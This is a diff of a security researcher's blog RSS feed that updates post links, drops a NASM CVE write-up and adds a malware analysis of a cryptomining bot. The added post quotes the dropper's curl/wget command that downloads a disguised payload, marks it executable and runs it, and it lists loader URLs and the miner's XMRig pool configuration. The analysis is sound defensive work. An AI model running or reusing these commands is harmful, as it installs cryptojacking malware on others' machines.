-                         &lt;span class=&quot;n&quot;&gt;in_absolute&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;absolute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;segment&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;segment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                         &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;However, down to a few lines of code, there is a check before the it gets initialized with a valid value which is then skipped because the boolean &lt;code class=&quot;highlighter-rouge&quot;&gt;insn_is_label&lt;/code&gt; is always FALSE.
-Therefore, the &lt;code class=&quot;highlighter-rouge&quot;&gt;result-&amp;gt;label&lt;/code&gt; remains NULL.&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
-
-            &lt;span class=&quot;cm&quot;&gt;/*  forw_ref */&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;I_EQU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-                    &lt;span class=&quot;n&quot;&gt;nasm_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERR_NONFATAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                               &lt;span class=&quot;s&quot;&gt;&quot;EQU not preceded by label&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operands&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
-                    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMMEDIATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
-                    &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wrt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NO_SEG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-                    &lt;span class=&quot;n&quot;&gt;define_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                                 &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;segment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                                 &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;So back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;assemble_line&lt;/code&gt;, there is a check if the opcode is EQU and surprisingly the nasm_error did not handle the error safely (marked as ERR_NONFATAL).
-The &lt;code class=&quot;highlighter-rouge&quot;&gt;output_ins.label&lt;/code&gt; is then being passed into 3 functions before it gets dereferenced (define_label -&amp;gt; find_label -&amp;gt; islocal).&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;islocal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tasm_compatible_mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'@'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'@'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;boom&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Wed, 05 Sep 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018/CVE-2018-16517/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018/CVE-2018-16517/</guid>
+        <pubDate>Tue, 14 Aug 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/08c6ac693d5d43fb8dec0451fe413e34/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/08c6ac693d5d43fb8dec0451fe413e34/</guid>
         
         
       </item>
@@ -1298,8 +1106,200 @@ Accept-Language: en-US,en;q=0.9
 &lt;/ol&gt;
 </description>
         <pubDate>Thu, 02 Aug 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018/CVE-2018-15887/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018/CVE-2018-15887/</guid>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-15887/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-15887/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>4ec4f1ec6a030c4969bd336258f6699e</title>
+        <description>&lt;p&gt;Initial file dropped was a Bash file containing following commands:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /var/tmp/.sys.log
+curl http://www.bizqsoft.com/imgtemplate/11.png &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /var/tmp/.sys.log &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; wget http://www.bizqsoft.com/imgtemplate/11.png &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /var/tmp/.sys.log
+&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;0777 /var/tmp/.sys.log
+/var/tmp/.sys.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;File &lt;code class=&quot;highlighter-rouge&quot;&gt;11.png&lt;/code&gt; was found packed using UPX packer. After the decompression, a list of websites has been found which is potentially has been compromised and used to host the loader for the bot.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[
+    &quot;http://www.ltj4949.com/weixin/loader.gif&quot;,
+    &quot;http://128.1.49.78/phpmyadmin/loader.gif&quot;,
+    &quot;http://111.231.230.124/data/loader.gif&quot;,
+    &quot;http://124.42.117.172/yjcm/loader.gif&quot;,
+    &quot;http://180.76.114.216/log/loader.gif&quot;,
+    &quot;http://103.17.95.45/log/loader.gif&quot;,
+    &quot;http://car.earthstudio.cn/static/img/loader.gif&quot;,
+    &quot;http://111.231.239.187/loader/loader.gif&quot;,
+    &quot;http://120.27.33.177:80/phpMyAdmin/locale/loader.gif&quot;,
+    &quot;http://120.55.53.187:80/website/e/data/loader.gif&quot;,
+    &quot;http://47.100.24.187:80/Mobile/data/loader.gif&quot;,
+    &quot;http://117.48.211.158:80/phpMyAdmin/locale/loader.gif&quot;,
+    &quot;http://47.97.217.130:80/heart_health/vendor/loader.gif&quot;,
+    &quot;http://132.148.151.76:80/phpMyAdmin/locale/loader.gif&quot;,
+    &quot;http://39.109.113.71/phpmyadmin/setup/loader.gif&quot;
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Further analysis shows that a miner is being fetched from any live domain from the list.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /posp_test/uploads/x86.png HTTP/1.1
+Host: 118.25.102.126
+Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; U&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Windows NT 6.0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; en-US&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:1.8.1.7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20070914 Firefox/2.0.0.7
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;XMRig miner credentials&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
+    &quot;id&quot;: 1,
+    &quot;jsonrpc&quot;: &quot;2.0&quot;,
+    &quot;method&quot;: &quot;login&quot;,
+    &quot;params&quot;: {
+        &quot;agent&quot;: &quot;XMRig/2.6.4 (Linux i686) libuv/1.19.3-dev gcc/7.2.0&quot;,
+        &quot;algo&quot;: [
+            &quot;cn/1&quot;,
+            &quot;cn/0&quot;,
+            &quot;cn/xtl&quot;,
+            &quot;cn/msr&quot;,
+            &quot;cn/xao&quot;,
+            &quot;cn/rto&quot;,
+            &quot;cn&quot;
+        ],
+        &quot;login&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
+        &quot;pass&quot;: &quot;x&quot;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Below is the list of mining server being use by the miner:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
+    &quot;algo&quot;: &quot;cryptonight&quot;,
+    &quot;api&quot;: {
+        &quot;port&quot;: 0,
+        &quot;access-token&quot;: null,
+        &quot;worker-id&quot;: null,
+        &quot;ipv6&quot;: false,
+        &quot;restricted&quot;: true
+    },
+    &quot;av&quot;: 0,
+    &quot;background&quot;: false,
+    &quot;colors&quot;: true,
+    &quot;cpu-affinity&quot;: null,
+    &quot;cpu-priority&quot;: null,
+    &quot;donate-level&quot;: 1,
+    &quot;huge-pages&quot;: true,
+    &quot;hw-aes&quot;: null,
+    &quot;log-file&quot;: null,
+    &quot;max-cpu-usage&quot;: 75,
+    &quot;pools&quot;: [
+        {
+            &quot;url&quot;: &quot;sg.minexmr.com:4444&quot;,
+            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
+            &quot;pass&quot;: &quot;x&quot;,
+            &quot;rig-id&quot;: null,
+            &quot;nicehash&quot;: false,
+            &quot;keepalive&quot;: false,
+            &quot;variant&quot;: 1
+        },
+        {
+            &quot;url&quot;: &quot;sg.minexmr.com:80&quot;,
+            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
+            &quot;pass&quot;: &quot;x&quot;,
+            &quot;rig-id&quot;: null,
+            &quot;nicehash&quot;: false,
+            &quot;keepalive&quot;: false,
+            &quot;variant&quot;: 1
+        },
+        {
+            &quot;url&quot;: &quot;sg.minexmr.com:443&quot;,
+            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
+            &quot;pass&quot;: &quot;x&quot;,
+            &quot;rig-id&quot;: null,
+            &quot;nicehash&quot;: false,
+            &quot;keepalive&quot;: false,
+            &quot;variant&quot;: 1
+        },
+        {
+            &quot;url&quot;: &quot;pool.minexmr.com:4444&quot;,
+            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
+            &quot;pass&quot;: &quot;x&quot;,
+            &quot;rig-id&quot;: null,
+            &quot;nicehash&quot;: false,
+            &quot;keepalive&quot;: false,
+            &quot;variant&quot;: 1
+        },
+        {
+            &quot;url&quot;: &quot;pool.minexmr.com:80&quot;,
+            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
+            &quot;pass&quot;: &quot;x&quot;,
+            &quot;rig-id&quot;: null,
+            &quot;nicehash&quot;: false,
+            &quot;keepalive&quot;: false,
+            &quot;variant&quot;: 1
+        },
+        {
+            &quot;url&quot;: &quot;pool.minexmr.com:443&quot;,
+            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
+            &quot;pass&quot;: &quot;x&quot;,
+            &quot;rig-id&quot;: null,
+            &quot;nicehash&quot;: false,
+            &quot;keepalive&quot;: false,
+            &quot;variant&quot;: 1
+        },
+        {
+            &quot;url&quot;: &quot;xmr-usa.dwarfpool.com:8005 &quot;,
+            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
+            &quot;pass&quot;: &quot;x&quot;,
+            &quot;rig-id&quot;: null,
+            &quot;nicehash&quot;: false,
+            &quot;keepalive&quot;: false,
+            &quot;variant&quot;: 1
+        },
+        {
+            &quot;url&quot;: &quot;xmr-usa.dwarfpool.com:8080&quot;,
+            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
+            &quot;pass&quot;: &quot;x&quot;,
+            &quot;rig-id&quot;: null,
+            &quot;nicehash&quot;: false,
+            &quot;keepalive&quot;: false,
+            &quot;variant&quot;: 1
+        },
+        {
+            &quot;url&quot;: &quot;pool.monero.hashvault.pro:443&quot;,
+            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
+            &quot;pass&quot;: &quot;x&quot;,
+            &quot;rig-id&quot;: null,
+            &quot;nicehash&quot;: false,
+            &quot;keepalive&quot;: false,
+            &quot;variant&quot;: 1
+        },
+        {
+            &quot;url&quot;: &quot;pool.monero.hashvault.pro:443&quot;,
+            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
+            &quot;pass&quot;: &quot;x&quot;,
+            &quot;rig-id&quot;: null,
+            &quot;nicehash&quot;: false,
+            &quot;keepalive&quot;: false,
+            &quot;variant&quot;: 1
+        }
+    ],
+    &quot;print-time&quot;: 600,
+    &quot;retries&quot;: 3,
+    &quot;retry-pause&quot;: 3,
+    &quot;safe&quot;: false,
+    &quot;threads&quot;: null,
+    &quot;user-agent&quot;: null,
+    &quot;watch&quot;: false
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Wed, 18 Jul 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/4ec4f1ec6a030c4969bd336258f6699e/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/4ec4f1ec6a030c4969bd336258f6699e/</guid>
         
         
       </item>
@@ -1330,8 +1330,8 @@ $ echo -ne “@core\0&quot; | socat unix-connect:./poc/nagios.qh -
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
         <pubDate>Mon, 09 Jul 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018/CVE-2018-13458/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018/CVE-2018-13458/</guid>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-13458/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-13458/</guid>
         
         
       </item>
@@ -1363,8 +1363,8 @@ $ echo -ne “@echo\0&quot; | socat unix-connect:./poc/nagios.qh -
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
         <pubDate>Mon, 09 Jul 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018/CVE-2018-13457/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018/CVE-2018-13457/</guid>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-13457/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-13457/</guid>
         
         
       </item>
@@ -1395,8 +1395,8 @@ $ echo -ne “@help\0&quot; | socat unix-connect:./poc/nagios.qh -
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
         <pubDate>Mon, 09 Jul 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018/CVE-2018-13441/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018/CVE-2018-13441/</guid>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-13441/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-13441/</guid>
         
         
       </item>
